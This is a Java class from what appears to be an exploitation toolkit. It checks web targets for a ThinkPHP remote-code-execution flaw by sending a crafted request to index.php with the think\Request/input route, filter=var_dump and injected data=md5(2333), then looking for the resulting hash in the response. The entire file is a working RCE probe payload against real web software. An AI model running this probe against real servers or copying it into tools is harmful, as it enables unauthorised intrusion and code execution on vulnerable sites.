package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_request_input_rce implements BasePayload {
    private static final String CheckStr="f7e0b956540676a129760a3eae309294";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.getHttpReuest(url + "/index.php?s=index/\\think\\Request/input&filter=var_dump&data=md5(2333)", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}